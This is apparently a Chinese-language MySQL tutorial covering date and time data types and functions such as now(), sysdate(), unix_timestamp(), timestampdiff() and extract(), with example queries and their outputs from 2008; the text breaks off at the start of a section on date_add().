<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">日期类型        存储空间       日期格式                 日期范围 </span><br><span class="line">------------ ---------   --------------------- ----------------------------------------- </span><br><span class="line">datetime       8 bytes   YYYY-MM-DD HH:MM:SS   1000<span class="string">-01</span><span class="string">-01</span> 00:00:00 ~ 9999<span class="string">-12</span><span class="string">-31</span> 23:59:59 </span><br><span class="line">timestamp      4 bytes   YYYY-MM-DD HH:MM:SS   1970<span class="string">-01</span><span class="string">-01</span> 00:00:01 ~ 2038 </span><br><span class="line">date           3 bytes   YYYY-MM-DD            1000<span class="string">-01</span><span class="string">-01</span>          ~ 9999<span class="string">-12</span><span class="string">-31</span> </span><br><span class="line">year           1 bytes   YYYY                  1901                ~ 2155</span><br></pre></td></tr></table></figure>

<p>在 MySQL 中创建表时，对照上面的表格，很容易就能选择到合适自己的数据类型。不过到底是选择 datetime 还是 timestamp，可能会有点犯难。</p>
<p>这两个日期时间类型各有优点：datetime 的日期范围比较大；timestamp 所占存储空间比较小，只是 datetime 的一半。</p>
<p>另外，timestamp 类型的列还有个特性：默认情况下，在 insert, update 数据时，timestamp 列会自动以当前时间（CURRENT_TIMESTAMP）填充 &#x2F; 更新。</p>
<p>“自动” 的意思就是，你不去管它，MySQL 会替你去处理。 </p>
<h2 id="建表的代码为"><a href="#建表的代码为" class="headerlink" title="建表的代码为:"></a>建表的代码为:</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t8 (</span><br><span class="line">  `id1` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">default</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  `id2` datetime <span class="keyword">default</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>一般情况下，我倾向于使用 datetime 日期类型。</p>
<h2 id="两者之间的比较"><a href="#两者之间的比较" class="headerlink" title="两者之间的比较:"></a>两者之间的比较:</h2><ol>
<li>timestamp 容易所支持的范围比 timedate 要小。 并且容易出现超出的情况</li>
<li>timestamp 比较受时区 timezone 的影响以及 MYSQL 版本和服务器的 SQL MODE 的影响.</li>
</ol>
<p>MySQL 时间类型：时间格式、所占存储空间、时间范围。 </p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">时间类型        存储空间      时间格式                 时间范围</span> </span><br><span class="line"><span class="literal">------------</span> <span class="literal">---------</span>   <span class="literal">---------------------</span> <span class="literal">-----------------------------------------</span> </span><br><span class="line"><span class="comment">time           3 bytes   HH:MM:SS</span>              <span class="literal">-</span><span class="comment">838:59:59          ~ 838:59:59</span></span><br></pre></td></tr></table></figure>

<p>time 时间范围居然有这么大的范围，特别是 time 可以取负值，有点奇怪。后来，看了 MySQL 手册才知道这是为了满足两个日期时间相减才这样设计的。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">select</span> timediff(&#x27;<span class="number">2000</span>:<span class="number">01</span>:<span class="number">31</span> <span class="number">23</span>:<span class="number">59</span>:<span class="number">59</span>&#x27;, &#x27;<span class="number">2000</span>:<span class="number">01</span>:<span class="number">01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;); -- <span class="number">743</span>:<span class="number">59</span>:<span class="number">59</span> </span><br><span class="line"><span class="attribute">select</span> timediff(&#x27;<span class="number">2000</span>:<span class="number">01</span>:<span class="number">01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;, &#x27;<span class="number">2000</span>:<span class="number">01</span>:<span class="number">31</span> <span class="number">23</span>:<span class="number">59</span>:<span class="number">59</span>&#x27;); -- -<span class="number">743</span>:<span class="number">59</span>:<span class="number">59</span> </span><br><span class="line"><span class="attribute">select</span> timediff(&#x27;<span class="number">23</span>:<span class="number">59</span>:<span class="number">59</span>&#x27;, &#x27;<span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;);                        -- <span class="number">11</span>:<span class="number">59</span>:<span class="number">59</span></span><br></pre></td></tr></table></figure>

<p>注意，timediff 的两个参数只能是 datetime&#x2F;timestamp, time 类型的，并且这两个参数类型要相同。</p>
<p>即：datetime&#x2F;timestamp 和 datetime&#x2F;timestamp 比较；time 和 time 相比较。</p>
<p>虽然 MySQL 中的日期时间类型比较丰富，但遗憾的是，目前（2008-08-08）这些日期时间类型只能支持到秒级别，不支持毫秒、微秒。也没有产生毫秒的函数。</p>
<p>《MySQL：MySQL 日期数据类型、MySQL 时间类型使用总结》适用于 MySQL 5.X 及以上版本。</p>
<h2 id="MySQL-获得当前日期时间-函数"><a href="#MySQL-获得当前日期时间-函数" class="headerlink" title="MySQL 获得当前日期时间 函数"></a>MySQL 获得当前日期时间 函数</h2><p>1.1 获得当前日期 + 时间（date + time）函数：now ()</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select now();</span><br><span class="line"></span><br><span class="line"><span class="code">+---------------------+</span> </span><br><span class="line">| now()               | </span><br><span class="line"><span class="code">+---------------------+</span> </span><br><span class="line"><span class="section">| 2008-08-08 22:20:46 | </span></span><br><span class="line"><span class="section">+---------------------+</span></span><br></pre></td></tr></table></figure>

<p>除了 now () 函数能获得当前的日期时间外，MySQL 中还有下面的函数：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">current_timestamp</span>() </span><br><span class="line">,<span class="built_in">current_timestamp</span> </span><br><span class="line">,<span class="built_in">localtime</span>() </span><br><span class="line">,<span class="built_in">localtime</span> </span><br><span class="line">,<span class="built_in">localtimestamp</span>    <span class="comment">-- (v4.0.6) </span></span><br><span class="line">,<span class="built_in">localtimestamp</span>() <span class="comment">-- (v4.0.6)</span></span><br></pre></td></tr></table></figure>

<p>这些日期时间函数，都等同于 now ()。鉴于 now () 函数简短易记，建议总是使用 now () 来替代上面列出的函数。</p>
<p>1.2 获得当前日期 + 时间（date + time）函数：sysdate ()</p>
<p>sysdate () 日期时间函数跟 now () 类似，不同之处在于：now () 在执行开始时值就得到了， sysdate () 在函数执行时动态得到值。看下面的例子就明白了：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select now(), sleep(3), now();</span><br><span class="line"></span><br><span class="line"><span class="code">+---------------------+</span>----------<span class="code">+---------------------+</span> </span><br><span class="line">| now()               | sleep(3) | now()               | </span><br><span class="line"><span class="code">+---------------------+</span>----------<span class="code">+---------------------+</span> </span><br><span class="line"><span class="section">| 2008-08-08 22:28:21 |        0 | 2008-08-08 22:28:21 | </span></span><br><span class="line"><span class="section">+---------------------+----------+---------------------+</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select sysdate(), sleep(3), sysdate();</span><br><span class="line"></span><br><span class="line"><span class="code">+---------------------+</span>----------<span class="code">+---------------------+</span> </span><br><span class="line">| sysdate()           | sleep(3) | sysdate()           | </span><br><span class="line"><span class="code">+---------------------+</span>----------<span class="code">+---------------------+</span> </span><br><span class="line"><span class="section">| 2008-08-08 22:28:41 |        0 | 2008-08-08 22:28:44 | </span></span><br><span class="line"><span class="section">+---------------------+----------+---------------------+</span></span><br></pre></td></tr></table></figure>

<p>可以看到，虽然中途 sleep 3 秒，但 now () 函数两次的时间值是相同的； sysdate () 函数两次得到的时间值相差 3 秒。</p>
<p>MySQL Manual 中是这样描述 sysdate () 的：<code>Return the time at which the function executes</code>。</p>
<h2 id="sysdate-日期时间函数，一般情况下很少用到。"><a href="#sysdate-日期时间函数，一般情况下很少用到。" class="headerlink" title="sysdate() 日期时间函数，一般情况下很少用到。"></a>sysdate() 日期时间函数，一般情况下很少用到。</h2><ol>
<li><p>获得当前日期（date）函数：curdate ()</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select curdate();</span><br><span class="line"></span><br><span class="line"><span class="code">+------------+</span> </span><br><span class="line">| curdate() | </span><br><span class="line"><span class="code">+------------+</span> </span><br><span class="line"><span class="section">| 2008-08-08 | </span></span><br><span class="line"><span class="section">+------------+</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>其中，下面的两个日期函数等同于 curdate()：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">current_date</span><span class="params">()</span></span>, current_date</span><br></pre></td></tr></table></figure>
</li>
<li><p>获得当前时间（time）函数：curtime()</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select curtime();</span><br><span class="line"></span><br><span class="line"><span class="code">+-----------+</span> </span><br><span class="line">| curtime() | </span><br><span class="line"><span class="code">+-----------+</span> </span><br><span class="line"><span class="section">| 22:41:30 | </span></span><br><span class="line"><span class="section">+-----------+</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>其中，下面的两个时间函数等同于 curtime()：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">current_time</span><span class="params">()</span></span>, current_time</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>获得当前 UTC 日期时间函数：utc_date (), utc_time (), utc_timestamp ()<figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">mysql</span>&gt; select utc_timestamp(), utc_date(), utc_time(), now()</span><br><span class="line"></span><br><span class="line">+---------------------+------------+------------+---------------------+ </span><br><span class="line">| utc_timestamp()     | utc_date() | utc_time() | now()               | </span><br><span class="line">+---------------------+------------+------------+---------------------+ </span><br><span class="line">| <span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">14</span>:<span class="number">47</span>:<span class="number">11</span> | <span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> | <span class="number">14</span>:<span class="number">47</span>:<span class="number">11</span>   | <span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">22</span>:<span class="number">47</span>:<span class="number">11</span> | </span><br><span class="line">+---------------------+------------+------------+---------------------+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>因为我国位于东八时区，所以本地时间 &#x3D; UTC 时间 + 8 小时。UTC 时间在业务涉及多个国家和地区的时候，非常有用。</p>
<h2 id="MySQL-时间戳（Timestamp）函数"><a href="#MySQL-时间戳（Timestamp）函数" class="headerlink" title="MySQL 时间戳（Timestamp）函数"></a>MySQL 时间戳（Timestamp）函数</h2><ol>
<li><p>MySQL 获得当前时间戳函数：current_timestamp, current_timestamp ()</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select current_timestamp, current_timestamp();</span><br><span class="line"></span><br><span class="line"><span class="code">+---------------------+</span>---------------------+ </span><br><span class="line">| current_timestamp   | current_timestamp() | </span><br><span class="line"><span class="code">+---------------------+</span>---------------------+ </span><br><span class="line"><span class="section">| 2008-08-09 23:22:24 | 2008-08-09 23:22:24 | </span></span><br><span class="line"><span class="section">+---------------------+---------------------+</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>MySQL （Unix 时间戳、日期）转换函数：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">unix_timestamp</span><span class="params">()</span></span>, </span><br><span class="line"><span class="function"><span class="title">unix_timestamp</span><span class="params">(date)</span></span>, </span><br><span class="line"><span class="function"><span class="title">from_unixtime</span><span class="params">(unix_timestamp)</span></span>, </span><br><span class="line"><span class="function"><span class="title">from_unixtime</span><span class="params">(unix_timestamp,format)</span></span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>下面是示例：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">unix_timestamp</span> ()</span>;                       -- <span class="number">1218290027</span>            === 得到当前时间的 UNIX 时间值</span><br></pre></td></tr></table></figure>

<p>将具体时间来转换成 timestamp</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">select</span> unix_timestamp(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span>&#x27;);           -- <span class="number">1218124800</span> </span><br><span class="line"><span class="attribute">select</span> unix_timestamp(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">12</span>:<span class="number">30</span>:<span class="number">00</span>&#x27;); -- <span class="number">1218169800</span></span><br></pre></td></tr></table></figure>

<p>将 timestamp 来转换成具体时间</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">select</span> from_unixtime(<span class="number">1218290027</span>);              -- &#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">21</span>:<span class="number">53</span>:<span class="number">47</span>&#x27; </span><br><span class="line"><span class="attribute">select</span> from_unixtime(<span class="number">1218124800</span>);              -- &#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>&#x27; </span><br><span class="line"><span class="attribute">select</span> from_unixtime(<span class="number">1218169800</span>);              -- &#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">12</span>:<span class="number">30</span>:<span class="number">00</span>&#x27;</span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> from_unixtime(<span class="number">1218169800</span>, &#x27;%Y %D %M %h:%i:%s %x&#x27;); -- &#x27;<span class="number">2008</span> <span class="number">8</span>th August <span class="number">12</span>:<span class="number">30</span>:<span class="number">00</span> <span class="number">2008</span>&#x27;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>MySQL 时间戳（timestamp）转换、增、减函数：<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">timestamp</span><span class="params">(date)</span></span>                                     -- date to timestamp </span><br><span class="line"><span class="function"><span class="title">timestamp</span><span class="params">(dt,time)</span></span>                                  -- <span class="selector-tag">dt</span> + <span class="selector-tag">time</span> </span><br><span class="line"><span class="function"><span class="title">timestampadd</span><span class="params">(unit,interval,datetime_expr)</span></span>           -- </span><br><span class="line"><span class="function"><span class="title">timestampdiff</span><span class="params">(unit,datetime_expr1,datetime_expr2)</span></span>   --</span><br></pre></td></tr></table></figure></li>
</ol>
<p>请看示例部分：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">select</span> timestamp(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span>&#x27;);                         -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> </span><br><span class="line"><span class="attribute">select</span> timestamp(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;, &#x27;<span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span>&#x27;);    -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">09</span>:<span class="number">01</span>:<span class="number">01</span> </span><br><span class="line"><span class="attribute">select</span> timestamp(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;, &#x27;<span class="number">10</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span>&#x27;); -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">18</span> <span class="number">09</span>:<span class="number">01</span>:<span class="number">01</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> timestampadd(day, <span class="number">1</span>, &#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;);     -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span> </span><br><span class="line"><span class="attribute">select</span> date_add(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;, interval <span class="number">1</span> day); -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">MySQL</span> timestampadd () 函数类似于 date_add ()。</span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> timestampdiff(year,&#x27;<span class="number">2002</span>-<span class="number">05</span>-<span class="number">01</span>&#x27;,&#x27;<span class="number">2001</span>-<span class="number">01</span>-<span class="number">01</span>&#x27;);                    -- -<span class="number">1</span> </span><br><span class="line"><span class="attribute">select</span> timestampdiff(day ,&#x27;<span class="number">2002</span>-<span class="number">05</span>-<span class="number">01</span>&#x27;,&#x27;<span class="number">2001</span>-<span class="number">01</span>-<span class="number">01</span>&#x27;);                    -- -<span class="number">485</span> </span><br><span class="line"><span class="attribute">select</span> timestampdiff(hour,&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;,&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;); -- -<span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> datediff(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;, &#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;);           -- <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">MySQL</span> timestampdiff () 函数就比 datediff () 功能强多了，datediff () 只能计算两个日期（date）之间相差的天数。</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<h2 id="MySQL-日期时间-Extract（选取）-函数。"><a href="#MySQL-日期时间-Extract（选取）-函数。" class="headerlink" title="MySQL 日期时间 Extract（选取） 函数。"></a>MySQL 日期时间 Extract（选取） 函数。</h2><ol>
<li><p>选取日期时间的各个部分：日期、时间、年、季度、月、日、小时、分钟、秒、微秒</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@dt</span> <span class="operator">=</span> <span class="string">&#x27;2008-09-10 07:15:30.123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="type">date</span>(<span class="variable">@dt</span>);        <span class="comment">-- 2008-09-10 </span></span><br><span class="line"><span class="keyword">select</span> <span class="type">time</span>(<span class="variable">@dt</span>);        <span class="comment">-- 07:15:30.123456 </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">year</span>(<span class="variable">@dt</span>);        <span class="comment">-- 2008 </span></span><br><span class="line"><span class="keyword">select</span> quarter(<span class="variable">@dt</span>);     <span class="comment">-- 3 </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">month</span>(<span class="variable">@dt</span>);       <span class="comment">-- 9 </span></span><br><span class="line"><span class="keyword">select</span> week(<span class="variable">@dt</span>);        <span class="comment">-- 36 </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">day</span>(<span class="variable">@dt</span>);         <span class="comment">-- 10 </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">hour</span>(<span class="variable">@dt</span>);        <span class="comment">-- 7 </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">minute</span>(<span class="variable">@dt</span>);      <span class="comment">-- 15 </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">second</span>(<span class="variable">@dt</span>);      <span class="comment">-- 30 </span></span><br><span class="line"><span class="keyword">select</span> microsecond(<span class="variable">@dt</span>); <span class="comment">-- 123456</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>MySQL Extract () 函数，可以上面实现类似的功能：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@dt</span> <span class="operator">=</span> <span class="string">&#x27;2008-09-10 07:15:30.123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(<span class="keyword">year</span>                <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 2008 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(quarter             <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 3 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(<span class="keyword">month</span>               <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 9 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(week                <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 36 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(<span class="keyword">day</span>                 <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 10 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(<span class="keyword">hour</span>                <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 7 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(<span class="keyword">minute</span>              <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 15 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(<span class="keyword">second</span>              <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 30 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(microsecond         <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 123456</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(year_month          <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 200809 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(day_hour            <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 1007 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(day_minute          <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 100715 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(day_second          <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 10071530 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(day_microsecond     <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">-- 10071530123456 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(hour_minute         <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">--    715 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(hour_second         <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">--    71530 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(hour_microsecond    <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">--    71530123456 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(minute_second       <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">--      1530 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(minute_microsecond <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">--      1530123456 </span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">extract</span>(second_microsecond <span class="keyword">from</span> <span class="variable">@dt</span>); <span class="comment">--        30123456</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>MySQL Extract () 函数除了没有 date (),time () 的功能外，其他功能一应具全。并且还具有选取‘day_microsecond’ 等功能。注意这里不是只选取 day 和 microsecond，而是从日期的 day 部分一直选取到 microsecond 部分。够强悍的吧！</p>
<p>MySQL Extract () 函数唯一不好的地方在于：你需要多敲几次键盘。</p>
<ol start="3">
<li>MySQL dayof… 函数：dayofweek (), dayofmonth (), dayofyear ()</li>
</ol>
<p>分别返回日期参数，在一周、一月、一年中的位置。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@dt</span> <span class="operator">=</span> <span class="string">&#x27;2008-08-08&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> dayofweek(<span class="variable">@dt</span>);   <span class="comment">-- 6 </span></span><br><span class="line"><span class="keyword">select</span> dayofmonth(<span class="variable">@dt</span>); <span class="comment">-- 8 </span></span><br><span class="line"><span class="keyword">select</span> dayofyear(<span class="variable">@dt</span>);   <span class="comment">-- 221</span></span><br></pre></td></tr></table></figure>

<p>日期 ‘2008-08-08’ 是一周中的第 6 天（1 &#x3D; Sunday, 2 &#x3D; Monday, …, 7 &#x3D; Saturday）；一月中的第 8 天；一年中的第 221 天。</p>
<ol start="4">
<li>MySQL week… 函数：week (), weekofyear (), dayofweek (), weekday (), yearweek ()<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@dt</span> <span class="operator">=</span> <span class="string">&#x27;2008-08-08&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> week(<span class="variable">@dt</span>);        <span class="comment">-- 31 </span></span><br><span class="line"><span class="keyword">select</span> week(<span class="variable">@dt</span>,<span class="number">3</span>);      <span class="comment">-- 32 </span></span><br><span class="line"><span class="keyword">select</span> weekofyear(<span class="variable">@dt</span>); <span class="comment">-- 32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> dayofweek(<span class="variable">@dt</span>);   <span class="comment">-- 6 </span></span><br><span class="line"><span class="keyword">select</span> weekday(<span class="variable">@dt</span>);     <span class="comment">-- 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> yearweek(<span class="variable">@dt</span>);    <span class="comment">-- 200831</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>MySQL week () 函数，可以有两个参数，具体可看手册。 weekofyear () 和 week () 一样，都是计算 “某天” 是位于一年中的第几周。 weekofyear (@dt) 等价于 week (@dt,3)。</p>
<p>MySQL weekday () 函数和 dayofweek () 类似，都是返回 “某天” 在一周中的位置。不同点在于参考的标准， weekday：(0 &#x3D; Monday, 1 &#x3D; Tuesday, …, 6 &#x3D; Sunday)； dayofweek：（1 &#x3D; Sunday, 2 &#x3D; Monday, …, 7 &#x3D; Saturday）</p>
<p>MySQL yearweek () 函数，返回 year (2008) + week 位置 (31)。</p>
<ol start="5">
<li>MySQL 返回星期和月份名称函数：dayname (), monthname ()<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@dt</span> <span class="operator">=</span> <span class="string">&#x27;2008-08-08&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> dayname(<span class="variable">@dt</span>);     <span class="comment">-- Friday </span></span><br><span class="line"><span class="keyword">select</span> monthname(<span class="variable">@dt</span>);   <span class="comment">-- August</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>思考，如何返回中文的名称呢？</p>
<ol start="6">
<li>MySQL last_day () 函数：返回月份中的最后一天。<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">select</span> last_day(&#x27;<span class="number">2008</span>-<span class="number">02</span>-<span class="number">01</span>&#x27;); -- <span class="number">2008</span>-<span class="number">02</span>-<span class="number">29</span> </span><br><span class="line"><span class="attribute">select</span> last_day(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span>&#x27;); -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">31</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>MySQL last_day () 函数非常有用，比如我想得到当前月份中有多少天，可以这样来计算：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select now(), day(last_day(now())) as days;</span><br><span class="line"></span><br><span class="line"><span class="code">+---------------------+</span>------+ </span><br><span class="line">| now()               | days | </span><br><span class="line"><span class="code">+---------------------+</span>------+ </span><br><span class="line"><span class="section">| 2008-08-09 11:45:45 |   31 | </span></span><br><span class="line"><span class="section">+---------------------+------+</span></span><br></pre></td></tr></table></figure>

<h2 id="MySQL-日期时间计算函数"><a href="#MySQL-日期时间计算函数" class="headerlink" title="MySQL 日期时间计算函数"></a>MySQL 日期时间计算函数</h2><ol>
<li><p>MySQL 为日期增加一个时间间隔：date_add ()</p>
